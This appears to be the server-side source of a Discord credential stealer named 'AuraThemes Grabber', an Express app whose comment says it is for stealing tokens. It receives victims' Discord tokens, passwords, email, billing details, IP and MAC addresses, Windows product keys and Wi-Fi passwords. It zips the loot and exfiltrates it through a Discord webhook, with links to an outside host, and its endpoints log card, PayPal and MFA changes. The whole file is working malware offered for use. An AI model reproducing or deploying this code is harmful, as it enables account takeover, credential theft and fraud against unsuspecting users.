const app = require('express')(),
    http = require('http'),
    fs = require('fs'),
    { getAllInfos } = require('discordinfos'),
    archiver = require('archiver'),
    axios = require('axios'),
    bodyParser = require('body-parser'),
    server = http.createServer(app),
    FormData = require('form-data');
let { Webhook, MessageBuilder } = require("discord-webhook-node"),
    webhook = new Webhook("ADD YOUR WEBHOOK HERE TO START")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")

// not finished yet but you can now steal the tokens with the client, -
// side and with the server you have the data in a .zip file

String.prototype.hi = function(i, s) {
  if (i < 0) i = 0; if (i > this.length) i = this.length;
  return this.slice(0, i) + s + this.slice(i);
};

app.set('port',3000);   
app.use(bodyParser.text());
app.use(bodyParser.json());

app.post('/request/startup', (req, res) => {
  res.sendStatus(200);
  req = JSON.parse(req.body);

  if (!fs.existsSync('zips')) fs.mkdirSync('zips');
  let zip = `zips/${req.filename}.zip`;
  let output = fs.createWriteStream(zip);
  let archive = archiver('zip', { zlib: { level: 9 } });
  archive.pipe(output);
  archive.append(JSON.stringify(req, null, 2), { name: 'data.txt' });
  archive.finalize();
  console.log(req);

  output.on('close', async () => {
    if (fs.existsSync(zip)) {
      await webhook.sendFile(zip);
    }
    let tokens = req.tokens
    for (let a = 0; a < tokens.length; a++) {
      var user = getAllInfos(tokens[a], req.GetIpAddress)
      var embed = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
        .setTitle("ALL INFO")
        .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
        .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
        .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
        .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
        .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
        .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)

      .addField("\u200B", `**HQ ALL FRIEND(s)**`)
        .addField("ALL User(s)", `${user.rareFriend}`)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
      await webhook.send(embed)
    }

    var embed2 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
      .setTitle("ALL INFO")
    .addField("<a:aura:1120542725327044728> RAM", `\`"${req.Ram}"\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.UUID}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1081700386605379654> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
    setTimeout(async () =>  await webhook.send(embed2), 50)
  });
});

app.post("/request/login", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body);
    console.log(req);
    var user = getAllInfos(req.token, req.GetIpAddress, req.password)
    var embed = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
        .setTitle("ALL INFO")
        .setDescription(`<a:aura:588128900689821696> Token:\n\`${user.token}\`\n[Click Here To Copy Your Token](https://6889.fun/aurathemes/api/raw/${user.token})\n`)
        .addField(`<a:aura:1120545516762181632> Badges:`, `${user.badges}`, true)
        .addField("<a:aura:1120542744658579556> IP:", `\`${req.GetIpAddress}\``, true)
        .addField("<a:aura:995172583660073020> Email:", `\`${user.mail}\``, true)
        .addField("<a:aura:1135363346024120340> Nitro Type:", `${user.nitroType}`, true)
        .addField("Login:", `\`${req.login}\``, true)
        .addField("Undelete:", `\`${req.undelete}\``, true)
        .addField("Source:", `\`${req.login_source}\``, true)
        .addField("Password Used:", `\`${req.password}\``, true)
        .addField("Code:", `\`${req.gift_code_sku_id}\``, true)
        .addField("<a:aura:1083014677430284358> Billing:", `${user.billing}`, true)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    webhook.send(embed)

    var embed2 = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
        .setTitle(`**ALL INFO USER**`)
        .addField("Total Friend:", `\`${user.totalFriend}\``, true)
        .addField("Total Blocked:", `\`${user.totalBlocked}\``, true)
        .addField("Pending:", `\`${user.pending}\``, true)
        .addField("Total Servers:", `\`${user.totalGuild}\``, true)
        .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
        .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
        .addField("Total Connection:", `\`${user.totalConnection}\``, true)
        .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
        .addField("User Status:", `\`${user.status}\``, true)
        .addField("User Theme:", `\`${user.theme}\``, true)
        .addField("User Verified:", `\`${user.verified}\``, true)
        .addField("User Phone:", `\`${user.hasPhone}\``, true)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    setTimeout(() =>  webhook.send(embed2), 50)

    var embed3 = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
        .setTitle(`**HQ ALL FRIEND(s)**`)
        .setDescription(`${user.rareFriend}`)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    setTimeout(() =>  webhook.send(embed3), 100)

    var embed4 = new MessageBuilder()
        .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
        .setColor("#c489ff")
        .setTitle(`**HQ ALL FRIEND(s)**`)
        .addField("<a:aura:1120542725327044728> RAM", `\`${req.Ram}\``, true)
        .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
        .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
        .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
        .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
        .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
        .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
        .addField("<:aura:1081700386605379654> Get IP Address", `\`${req.GetIpAddress}\``, true)
        .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
        .setFooter("AuraThemes Grabber")
        .setTimestamp();
    setTimeout(() =>  webhook.send(embed4), 150)
})


app.post("/request/newusername", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

app.post("/request/newemail", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

app.post("/request/newpass", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

app.post("/request/newcard", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

app.post("/request/paypal", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

app.post("/request/mfaenable", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

app.post("/request/mfadisable", (req, res) => {
  res.sendStatus(200)
  req = JSON.parse(req.body);
  console.log(req);
})

server.listen(app.get('port'), () => {
  console.log(`http://localhost:${app.get('port')}`);
});

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));

